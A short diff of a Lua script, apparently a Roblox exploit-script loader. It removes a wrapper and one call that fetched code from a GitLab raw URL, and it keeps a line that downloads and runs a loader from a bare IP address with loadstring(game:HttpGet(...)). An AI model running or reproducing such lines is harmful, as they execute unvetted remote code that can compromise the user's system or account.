@@ -1,9 +1,2 @@
-local function s1()
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua"))()
-end
-local function s2()
 ID="5891ec86-b9a4-4c58-8ed1-7ae1a24927bd";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
-end
-task.spawn(s1)
-task.spawn(s2)
